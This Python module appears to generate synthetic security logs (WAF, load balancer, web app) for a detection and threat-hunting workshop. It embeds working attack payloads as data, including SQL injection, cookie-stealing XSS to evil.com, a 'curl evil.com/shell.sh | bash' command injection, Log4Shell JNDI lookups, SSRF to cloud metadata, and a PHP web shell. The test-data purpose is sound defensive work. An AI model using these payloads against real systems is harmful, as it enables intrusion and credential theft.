"""Auto-extracted from generate_test_logs.py — web synthetic events.

Behavior-preserving split: function bodies are unchanged. Shared constants and
helpers live in ``testlogs.common`` and are imported via star import.
"""
import json
import ntpath
import os
import random
import re
import sys
import uuid
from datetime import datetime, timedelta, timezone
from pathlib import Path

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from testlogs.common import *  # noqa: F401,F403


def waf_event(action, http_method, url, rule_type="PROTECTION_RULES", rule_key="",
              client_ip=None, user_agent=None, response_code="403",
              body_data="", content_type="text/html", trace_id=None,
              request_headers=None, offset=0):
    """Generate a WAF security event."""
    if client_ip is None:
        client_ip = random.choice(ATTACKER_IPS)
    if user_agent is None:
        user_agent = random.choice(ATTACKER_UAS)
    headers = request_headers if request_headers is not None else f"Host: {WAF_HOST}"
    return {
        "timeCreated": ts(offset),
        "action": action,
        "httpMethod": http_method,
        "requestUrl": url,
        "queryString": url.split("?", 1)[1] if "?" in url else "",
        "clientAddress": client_ip,
        "countryCode": random.choice(["RU", "CN", "KP", "IR", "US", "DE", "BR"]),
        "userAgent": user_agent,
        "responseCode": response_code,
        "type": rule_type,
        "protectionRuleKey": rule_key,
        "protectionRuleAction": action,
        "bodyData": body_data,
        "contentType": content_type,
        "referer": "",
        "requestHeaders": headers,
        "wafPolicy": "seven-kingdoms-portal-waf",
        "fingerprint": uuid.uuid4().hex[:12],
        "traceId": trace_id or f"trace_{uuid.uuid4().hex[:16]}",
        "hostname": WAF_HOST,
        "msg": f"WAF {action}: {http_method} {url[:80]}",
    }


def lb_access_event(http_method, url, status_code, client_ip=None, user_agent=None,
                    bytes_sent="256", backend_address="10.0.1.50:9010",
                    trace_id=None, offset=0):
    """Generate a Load Balancer access log event."""
    if client_ip is None:
        client_ip = random.choice(ATTACKER_IPS)
    if user_agent is None:
        user_agent = random.choice(ATTACKER_UAS)
    return {
        "timeCreated": ts(offset),
        "httpMethod": http_method,
        "requestUrl": url,
        "uriPath": url.split("?")[0],
        "queryString": url.split("?", 1)[1] if "?" in url else "",
        "clientAddress": client_ip,
        "userAgent": user_agent,
        "statusCode": str(status_code),
        "backendStatusCode": str(status_code),
        "backendAddress": backend_address,
        "bytesReceived": str(random.randint(100, 5000)),
        "bytesSent": bytes_sent,
        "requestProcessingTime": str(random.randint(1, 500)),
        "hostname": WAF_HOST,
        "lbName": "seven-kingdoms-portal-lb",
        "listenerName": "http-listener",
        "contentType": "application/json",
        "referer": f"https://{WAF_HOST}/",
        "traceId": trace_id or f"trace_{uuid.uuid4().hex[:16]}",
        "msg": f"{http_method} {url} {status_code}",
    }


def webapp_event(attack_type, owasp_category, url, http_method="GET",
                 status_code="200", payload="", client_ip=None,
                 user_agent=None, trace_id=None, hostname=None, offset=0):
    """Generate a web application security event."""
    if client_ip is None:
        client_ip = random.choice(ATTACKER_IPS)
    if user_agent is None:
        user_agent = random.choice(ATTACKER_UAS)
    return {
        "timestamp": ts(offset),
        "httpMethod": http_method,
        "requestUrl": url,
        "uriPath": url.split("?")[0],
        "queryString": url.split("?", 1)[1] if "?" in url else "",
        "clientAddress": client_ip,
        "userAgent": user_agent,
        "statusCode": str(status_code),
        "attackType": attack_type,
        "attackPayload": payload,
        "owaspCategory": owasp_category,
        "vulnerabilityId": f"CVE-2024-DEMO-{random.randint(100, 999)}",
        "sessionId": f"sess_{uuid.uuid4().hex[:12]}",
        "appName": "seven-kingdoms-portal",
        "requestId": f"req_{uuid.uuid4().hex[:8]}",
        "traceId": trace_id or f"trace_{uuid.uuid4().hex[:16]}",
        "hostname": hostname or WAF_HOST,
        "requestBody": payload,
        "contentType": "application/json",
        "user": random.choice(["anonymous", "joffrey", "cersei", "tyrion"]),
        "msg": f"{attack_type}: {http_method} {url[:80]}",
    }


def generate_waf_events():
    """Generate WAF security events for all OWASP attack types."""
    events = []

    # SQL Injection attacks (blocked)
    sqli_payloads = [
        "/vulnerable/search?q=1' OR '1'='1",
        "/vulnerable/search?q=' UNION SELECT username,password FROM users--",
        "/vulnerable/login?user=admin'--&pass=x",
        "/vulnerable/api/users?id=1; DROP TABLE sessions",
        "/vulnerable/search?q=' AND SLEEP(5)--",
        "/vulnerable/search?q=1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
        "/vulnerable/search?q=' UNION SELECT NULL,table_name FROM INFORMATION_SCHEMA.TABLES--",
    ]
    for i, payload in enumerate(sqli_payloads):
        events.append(waf_event("BLOCK", "GET", payload, rule_key="942100", offset=i))
    # SQLi allowed through (detection mode)
    events.append(waf_event("DETECT", "GET", "/vulnerable/search?q=1' OR '1'='1",
                            rule_key="942100", response_code="200", offset=8))

    # Fresh 24-hour SQLi showcase events for live threat-hunting demos.
    # They sit ~2 hours before "now" so the l24h dashboard widget remains
    # populated even after a long workshop setup window.
    recent_sqli_payloads = [
        "/crm/search?q=1' OR 1=1--",
        "/shop/api/orders?sort=UNION%20SELECT%20username,password%20FROM%20users",
        "/crm/reports?id=1' AND SLEEP(5)--",
    ]
    for i, payload in enumerate(recent_sqli_payloads):
        events.append(waf_event(
            "BLOCK", "GET", payload,
            rule_key="942100",
            client_ip=WEB_TO_CLOUD_ATTACKER_IP,
            user_agent="sqlmap/1.7",
            trace_id=f"trace_waf_sqli_24h_{i:02d}",
            offset=1320 + (i * 2),
        ))

    # XSS attacks (blocked)
    xss_payloads = [
        "/vulnerable/comment?text=<script>alert('XSS')</script>",
        "/vulnerable/search?q=<img src=x onerror=alert(document.cookie)>",
        "/vulnerable/profile?name=<svg onload=alert(1)>",
        "/vulnerable/feedback?msg=<iframe src=javascript:alert('XSS')>",
        "/vulnerable/search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
    ]
    for i, payload in enumerate(xss_payloads):
        events.append(waf_event("BLOCK", "GET", payload, rule_key="941160", offset=10 + i))

    # Path Traversal attacks
    traversal_payloads = [
        "/vulnerable/file?path=../../../etc/passwd",
        "/vulnerable/download?file=..%2f..%2f..%2fetc%2fshadow",
        "/vulnerable/read?doc=....//....//etc/passwd",
        "/vulnerable/static/../../../proc/self/environ",
    ]
    for i, payload in enumerate(traversal_payloads):
        events.append(waf_event("BLOCK", "GET", payload, rule_key="930100", offset=16 + i))

    # Command Injection attacks
    cmdi_payloads = [
        "/vulnerable/ping?host=; cat /etc/passwd",
        "/vulnerable/dns?lookup=| id",
        "/vulnerable/exec?cmd=$(whoami)",
        "/vulnerable/api/run?input=`/bin/bash -c 'curl http://evil.com/shell.sh | bash'`",
    ]
    for i, payload in enumerate(cmdi_payloads):
        events.append(waf_event("BLOCK", "GET", payload, rule_key="932100", offset=21 + i))

    # SSRF attacks
    ssrf_payloads = [
        "/vulnerable/fetch?url=http://169.254.169.254/latest/meta-data/",
        "/vulnerable/proxy?target=http://metadata.oraclecloud.com/opc/v2/",
        "/vulnerable/image?src=http://127.0.0.1:8080/admin",
        "/vulnerable/webhook?callback=http://10.0.1.50:9090/internal-api",
    ]
    for i, payload in enumerate(ssrf_payloads):
        events.append(waf_event("BLOCK", "GET", payload, rule_key="934100", offset=26 + i))

    # XXE attacks
    events.append(waf_event("BLOCK", "POST", "/vulnerable/api/xml",
                            rule_key="933100",
                            body_data='<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
                            content_type="application/xml", offset=31))

    # SSTI attacks
    ssti_payloads = [
        "/vulnerable/template?name={{7*7}}",
        "/vulnerable/render?tpl={{config.__class__.__init__.__globals__}}",
        "/vulnerable/preview?data={{''.__class__.__mro__[1].__subclasses__()}}",
    ]
    for i, payload in enumerate(ssti_payloads):
        events.append(waf_event("BLOCK", "GET", payload, rule_key="934200", offset=33 + i))

    # Log4Shell attacks
    log4j_payloads = [
        "/vulnerable/api/log?msg=${jndi:ldap://evil.com/exploit}",
        "/vulnerable/search?q=${${lower:j}${upper:n}${lower:d}${upper:i}:ldap://evil.com/a}",
    ]
    for i, payload in enumerate(log4j_payloads):
        events.append(waf_event("BLOCK", "GET", payload, rule_key="944100", offset=37 + i))

    # NoSQL injection
    events.append(waf_event("BLOCK", "GET",
                            "/vulnerable/api/user?username[$ne]=null&password[$gt]=",
                            rule_key="942100", offset=40))

    # LDAP injection
    events.append(waf_event("BLOCK", "GET",
                            "/vulnerable/ldap?filter=*)(cn=admin)(&",
                            rule_key="942200", offset=41))

    # Web shell upload
    events.append(waf_event("BLOCK", "POST", "/vulnerable/upload/shell.php",
                            rule_key="933100",
                            body_data='<?php system($_GET["cmd"]); ?>',
                            content_type="multipart/form-data", offset=42))

    # Rate limiting events
    rate_limit_ip = "91.92.109.18"
    for i in range(15):
        events.append(waf_event("BLOCK", "GET", "/vulnerable/login",
                                rule_type="REQUEST_RATE_LIMITING",
                                client_ip=rate_limit_ip,
                                user_agent="Mozilla/5.0 (compatible; Hydra/9.0)",
                                response_code="429", offset=50 + i))

    # Protocol attacks
    events.append(waf_event("BLOCK", "GET", "/vulnerable/api",
                            rule_key="920100",
                            body_data="", offset=66))

    # CORS bypass — explicit Origin header attacks blocked by WAF.
    cors_origins = [
        "Origin: null",
        "Origin: http://evil.example.com",
        "Origin: https://evil.example.com",
        "Origin: http://attacker.local",
        "Origin: https://attacker.local",
        "Access-Control-Allow-Origin: *",
    ]
    for i, origin_hdr in enumerate(cors_origins):
        events.append(waf_event(
            "BLOCK", "GET", "/vulnerable/api/data",
            rule_key="980100",
            request_headers=f"Host: {WAF_HOST}\n{origin_hdr}",
            offset=67 + i,
        ))

    # SQLi attack DETECTED but allowed through (audit / log-only mode).
    # The detection widget filters Action='DETECT' explicitly to surface
    # WAF events where the rule fired without blocking the request.
    sqli_allowed_payloads = [
        "/api/orders?id=1' OR '1'='1",
        "/api/users?email=admin'--",
        "/api/products?cat=1 UNION SELECT password FROM users--",
        "/api/login?u=admin' OR 1=1--",
        "/search?q=' or 1=1 SLEEP(5)--",
        "/api/data?q=DROP TABLE users--",
        "/api/settings?key=' UNION SELECT * FROM INFORMATION_SCHEMA.TABLES--",
    ]
    for i, payload_url in enumerate(sqli_allowed_payloads):
        events.append(waf_event(
            "DETECT", "GET", payload_url,
            rule_key="942100",
            response_code="200",
            offset=80 + i,
        ))

    cross_tier_attacks = [
        ("BLOCK", "GET", "/crm/search?q=%3Cscript%3Ealert(1)%3C/script%3E",
         "trace_attack_00", "941100", 70),
        ("BLOCK", "GET", "/shop/products?name=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E",
         "trace_attack_01", "941100", 71),
        ("BLOCK", "GET", "/crm/search?q=1'%20OR%201=1--",
         "trace_attack_02", "942100", 72),
        ("BLOCK", "GET", "/shop/api/orders?sort=UNION%20SELECT%20username,password%20FROM%20users",
         "trace_attack_03", "942270", 73),
        ("BLOCK", "GET", "/crm/checkout?miner=coinhive",
         "trace_attack_04", "933100", 74),
        ("BLOCK", "GET", "/shop/profile?payload=javascript:alert(1)",
         "trace_attack_05", "941160", 75),
    ]
    for action, method, url, trace_id, rule_key, off in cross_tier_attacks:
        events.append(waf_event(action, method, url,
                                rule_key=rule_key,
                                trace_id=trace_id,
                                offset=off))

    events.append(waf_event(
        "DETECT", "GET", WEB_TO_CLOUD_REQUEST_URL,
        rule_key="934100",
        client_ip=WEB_TO_CLOUD_ATTACKER_IP,
        user_agent=WEB_TO_CLOUD_ATTACKER_UA,
        response_code="200",
        trace_id=WEB_TO_CLOUD_TRACE_ID,
        offset=120,
    ))

    events.extend([
        waf_event(
            "DETECT", "POST",
            "/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/_layouts/15/spinstall0.aspx",
            rule_key="933130",
            client_ip=TOOL_SHELL_ATTACKER_IP,
            user_agent="python-requests/2.31.0",
            response_code="200",
            body_data="__VIEWSTATE=/wEPDwUKMTY...; webshell=spinstall0.aspx",
            trace_id=TOOL_SHELL_TRACE_ID,
            offset=122,
        ),
        waf_event(
            "BLOCK", "POST",
            "/_layouts/15/spinstall0.aspx?cmd=whoami",
            rule_key="932100",
            client_ip=TOOL_SHELL_ATTACKER_IP,
            user_agent="python-requests/2.31.0",
            response_code="403",
            body_data="cmd=whoami",
            trace_id=TOOL_SHELL_TRACE_ID,
            offset=123,
        ),
    ])

    return events


def generate_lb_access_events():
    """Generate Load Balancer access log events for web attack detection."""
    events = []
    scanner_ip = "45.33.32.156"

    # Vulnerability scanner traffic
    scanner_paths = [
        "/admin", "/wp-admin", "/phpmyadmin", "/.env", "/.git/config",
        "/backup", "/db", "/debug", "/console", "/swagger",
        "/api-docs", "/actuator/health", "/graphql", "/server-status",
        "/robots.txt", "/sitemap.xml", "/composer.json", "/Dockerfile",
        "/jenkins", "/solr/admin", "/hudson", "/boaform/admin", "/manager/html",
        "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    ]
    for i, path in enumerate(scanner_paths):
        events.append(lb_access_event("GET", path, 404,
                                      client_ip=scanner_ip,
                                      user_agent="Nikto/2.1.6", offset=i))

    # Brute force login attempts
    brute_ip = "185.220.101.1"
    for i in range(25):
        events.append(lb_access_event("POST", "/vulnerable/login", 401,
                                      client_ip=brute_ip,
                                      user_agent="Mozilla/5.0 (compatible; Hydra/9.0)",
                                      offset=20 + i))
    # Successful login after brute force
    events.append(lb_access_event("POST", "/vulnerable/login", 200,
                                  client_ip=brute_ip,
                                  user_agent="Mozilla/5.0 (compatible; Hydra/9.0)",
                                  offset=46))

    # Sensitive data access
    events.append(lb_access_event("GET", "/vulnerable/backup.sql", 200,
                                  bytes_sent="524288", offset=50))
    events.append(lb_access_event("GET", "/vulnerable/.env", 200,
                                  bytes_sent="1024", offset=51))
    events.append(lb_access_event("GET", "/vulnerable/debug/config.ini", 200,
                                  bytes_sent="2048", offset=52))

    # HTTP method abuse
    events.append(lb_access_event("DELETE", "/vulnerable/api/users/1", 200, offset=55))
    events.append(lb_access_event("PUT", "/vulnerable/api/settings", 200, offset=56))
    events.append(lb_access_event("TRACE", "/vulnerable/api/echo", 200, offset=57))

    # Large response exfiltration
    events.append(lb_access_event("GET", "/vulnerable/api/users/export", 200,
                                  bytes_sent="10485760", offset=60))
    events.append(lb_access_event("GET", "/vulnerable/api/data/dump", 200,
                                  bytes_sent="52428800", offset=61))

    # Server errors (injection-caused)
    for i in range(8):
        events.append(lb_access_event("POST",
                                      f"/vulnerable/api/query?sql=SELECT * FROM users WHERE id={i}'",
                                      500, offset=65 + i))

    # API unauthorized
    for i in range(10):
        events.append(lb_access_event("GET", f"/api/v1/admin/users?page={i}", 403,
                                      offset=75 + i))

    # Suspicious user agents
    events.append(lb_access_event("GET", "/vulnerable/", 200,
                                  user_agent="", offset=86))
    events.append(lb_access_event("GET", "/vulnerable/",  200,
                                  user_agent="masscan/1.3.2", offset=87))
    events.append(lb_access_event("GET", "/vulnerable/", 200,
                                  user_agent="zgrab/0.x", offset=88))

    for idx, method in enumerate(["GET", "GET", "GET", "POST"]):
        events.append(lb_access_event(
            method,
            "/beacon",
            200,
            client_ip="10.0.0.5",
            user_agent="vsagent/1.0",
            bytes_sent="128" if method == "GET" else "2048",
            backend_address="192.168.56.1:80",
            trace_id="trace_flf_vsagent_001",
            offset=91 + idx,
        ))

    # Normal traffic (for baseline)
    normal_uas = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    ]
    for i in range(20):
        events.append(lb_access_event("GET", f"/portal/page{i}",  200,
                                      client_ip=random.choice(CORPORATE_IPS),
                                      user_agent=random.choice(normal_uas),
                                      offset=100 + i))

    events.append(lb_access_event(
        "GET", WEB_TO_CLOUD_REQUEST_URL, 200,
        client_ip=WEB_TO_CLOUD_ATTACKER_IP,
        user_agent=WEB_TO_CLOUD_ATTACKER_UA,
        bytes_sent="8192",
        backend_address=f"{WEB_TO_CLOUD_COMPROMISED_PRIVATE_IP}:9010",
        trace_id=WEB_TO_CLOUD_TRACE_ID,
        offset=125,
    ))

    events.extend([
        lb_access_event(
            "POST",
            "/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/_layouts/15/spinstall0.aspx",
            200,
            client_ip=TOOL_SHELL_ATTACKER_IP,
            user_agent="python-requests/2.31.0",
            bytes_sent="12288",
            backend_address=f"{TOOL_SHELL_BACKEND}:443",
            trace_id=TOOL_SHELL_TRACE_ID,
            offset=127,
        ),
        lb_access_event(
            "POST",
            "/_layouts/15/spinstall0.aspx?cmd=whoami",
            500,
            client_ip=TOOL_SHELL_ATTACKER_IP,
            user_agent="python-requests/2.31.0",
            bytes_sent="4096",
            backend_address=f"{TOOL_SHELL_BACKEND}:443",
            trace_id=TOOL_SHELL_TRACE_ID,
            offset=128,
        ),
    ])

    return events


def generate_webapp_events():
    """Generate web application security events for OWASP attack detection."""
    events = []
    attacker_ip = "194.5.249.7"

    # IDOR attacks
    for i in range(5):
        events.append(webapp_event(
            "IDOR", "A01:2021-Broken Access Control",
            f"/vulnerable/api/users/{i + 100}", "GET", "200",
            payload=f"id={i + 100}",
            client_ip=attacker_ip, offset=i))

    # Privilege escalation
    events.append(webapp_event(
        "privilege_escalation", "A01:2021-Broken Access Control",
        "/vulnerable/api/users/me", "PUT", "200",
        payload='{"role":"admin","isAdmin":true}',
        client_ip=attacker_ip, offset=6))
    events.append(webapp_event(
        "role_manipulation", "A01:2021-Broken Access Control",
        "/vulnerable/api/settings", "POST", "200",
        payload='{"permissions":"*","role":"admin"}',
        client_ip=attacker_ip, offset=7))

    # Authentication bypass
    events.append(webapp_event(
        "authentication_bypass", "A07:2021-Identification and Authentication Failures",
        "/vulnerable/admin/dashboard", "GET", "200",
        payload="jwt_token_manipulated",
        client_ip=attacker_ip, offset=9))
    events.append(webapp_event(
        "jwt_manipulation", "A07:2021-Identification and Authentication Failures",
        "/vulnerable/api/token/refresh", "POST", "200",
        payload='{"alg":"none","typ":"JWT"}',
        client_ip=attacker_ip, offset=10))

    # Insecure deserialization
    events.append(webapp_event(
        "deserialization", "A08:2021-Software and Data Integrity Failures",
        "/vulnerable/api/import", "POST", "500",
        payload="rO0ABXNyABFqYXZhLmxhbmcuUnVudGltZQ==",
        client_ip=attacker_ip, offset=12))

    # Session hijacking
    events.append(webapp_event(
        "session_hijacking", "A07:2021-Identification and Authentication Failures",
        "/vulnerable/dashboard", "GET", "200",
        payload="stolen_session_token",
        client_ip="23.129.64.100", offset=14))

    # Mass assignment
    events.append(webapp_event(
        "mass_assignment", "A04:2021-Insecure Design",
        "/vulnerable/api/users/register", "POST", "200",
        payload='{"username":"attacker","password":"pass123","isAdmin":true,"role":"admin","balance":999999}',
        client_ip=attacker_ip, offset=16))

    events.append(webapp_event(
        "ssrf_metadata_access", "A10:2021-Server-Side Request Forgery",
        WEB_TO_CLOUD_REQUEST_URL, "GET", "200",
        payload="url=http://169.254.169.254/opc/v2/instance/",
        client_ip=WEB_TO_CLOUD_ATTACKER_IP,
        user_agent=WEB_TO_CLOUD_ATTACKER_UA,
        trace_id=WEB_TO_CLOUD_TRACE_ID,
        hostname=WEB_TO_CLOUD_COMPROMISED_HOST,
        offset=24,
    ))

    events.extend([
        webapp_event(
            "SharePoint_ToolShell_Exploit",
            "A03:2021-Injection",
            "/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/_layouts/15/spinstall0.aspx",
            "POST",
            "200",
            payload="__VIEWSTATE=/wEPDwUKMTY...; webshell=spinstall0.aspx",
            client_ip=TOOL_SHELL_ATTACKER_IP,
            user_agent="python-requests/2.31.0",
            trace_id=TOOL_SHELL_TRACE_ID,
            hostname=TOOL_SHELL_HOST,
            offset=26,
        ),
        webapp_event(
            "SharePoint_ToolShell_Webshell_Command",
            "A03:2021-Injection",
            "/_layouts/15/spinstall0.aspx?cmd=whoami",
            "POST",
            "500",
            payload="cmd=whoami",
            client_ip=TOOL_SHELL_ATTACKER_IP,
            user_agent="python-requests/2.31.0",
            trace_id=TOOL_SHELL_TRACE_ID,
            hostname=TOOL_SHELL_HOST,
            offset=27,
        ),
    ])

    return events
